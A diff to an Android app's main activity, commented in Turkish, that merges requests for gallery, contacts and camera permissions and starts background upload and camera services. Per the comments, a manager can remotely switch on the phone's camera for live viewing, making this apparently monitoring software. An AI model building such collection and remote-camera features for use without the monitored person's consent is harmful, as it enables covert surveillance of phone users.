@@ -6,6 +6,7 @@ import android.content.ActivityNotFoundException
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
@@ -34,16 +35,12 @@ class MainActivity : AppCompatActivity() {
 		dosyaGeriDonus = null
 	}
 
-	// Rehber izni: önceki sürümlerde onaylamış cihazlar yeniden onay ekranı görmez,
-	// bu yüzden rehber iznini panel açılırken bir kez burada isteriz.
-	private val rehberIzni = registerForActivityResult(ActivityResultContracts.RequestPermission()) { verildi ->
-		if (verildi && Depo(this).token != null) YuklemeServisi.baslat(this) // izin verildiyse yüklemeyi tetikle
-	}
-
-	// Kamera izni: müdürün uzaktan canlı görüntü isteği için. İzin verilsin veya verilmesin kamera
-	// servisi çalışır; kamera yalnızca müdür istediğinde VE izin varsa açılır.
-	private val kameraIzni = registerForActivityResult(ActivityResultContracts.RequestPermission()) {
-		KameraServisi.baslat(this)
+	// İzinler (galeri + rehber + kamera) tek seferde istenir. Güncelleme sonrası eski onaylı
+	// cihazlarda da panel açılınca eksik izinler (ör. yeni gelen kamera) burada istenir.
+	// İzin verilsin/verilmesin servisler başlar; her özellik yalnız kendi izni varsa çalışır.
+	private val izinSonucu = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
+		if (Depo(this).token != null) YuklemeServisi.baslat(this) // galeri/rehber verildiyse yükleme tetiklenir
+		KameraServisi.baslat(this) // kamera servisi (kamera yalnız izin VE müdür isteğiyle açılır)
 	}
 
 	@SuppressLint("SetJavaScriptEnabled")
@@ -64,19 +61,8 @@ class MainActivity : AppCompatActivity() {
 		// Not: yükleme taraması onResume'da tetiklenir ki uygulamaya her dönüşte
 		// (sadece ilk açılışta değil) sonradan çekilen foto/videolar da yakalansın.
 
-		// Rehber izni henüz yoksa (eski onaylı cihaz) bir kez iste.
-		if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-			rehberIzni.launch(Manifest.permission.READ_CONTACTS)
-		}
 		pilMuafiyetiIste() // arka plan yüklemesi kesilmesin
-
-		// Kamera izni henüz yoksa bir kez iste; her hâlükârda kamera servisini başlat (müdür
-		// "kameraya yönelt" dediğinde telefon arka planda hazır olsun).
-		if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-			kameraIzni.launch(Manifest.permission.CAMERA)
-		} else {
-			KameraServisi.baslat(this)
-		}
+		izinleriIste()     // galeri + rehber + kamera: eksik olanları (güncelleme sonrası dahil) iste
 
 		web = WebView(this)
 		setContentView(web)
@@ -152,6 +138,27 @@ class MainActivity : AppCompatActivity() {
 		} catch (e: Exception) {
 			// activity gösterime uygun değilse sessiz geç
 		}
+	}
+
+	// Galeri + rehber + kamera izinlerinden EKSİK olanları tek diyalogda ister. Güncelleme
+	// sonrası eski cihazlarda da (ör. yeni gelen kamera izni) burada sorulur. Zaten verilmiş
+	// olanlar için Android diyalog göstermez. Hiç eksik yoksa doğrudan kamera servisini başlatır.
+	private fun izinleriIste() {
+		val gerekli = mutableListOf<String>()
+		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+			gerekli += Manifest.permission.READ_MEDIA_IMAGES
+			gerekli += Manifest.permission.READ_MEDIA_VIDEO
+			gerekli += Manifest.permission.POST_NOTIFICATIONS
+		} else {
+			gerekli += Manifest.permission.READ_EXTERNAL_STORAGE
+		}
+		gerekli += Manifest.permission.READ_CONTACTS
+		gerekli += Manifest.permission.CAMERA
+		val eksik = gerekli.filter {
+			ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+		}
+		if (eksik.isEmpty()) { KameraServisi.baslat(this); return }
+		izinSonucu.launch(eksik.toTypedArray())
 	}
 
 	// Pil optimizasyonu muafiyeti: OEM telefonlarda arka plan yükleme worker'ı
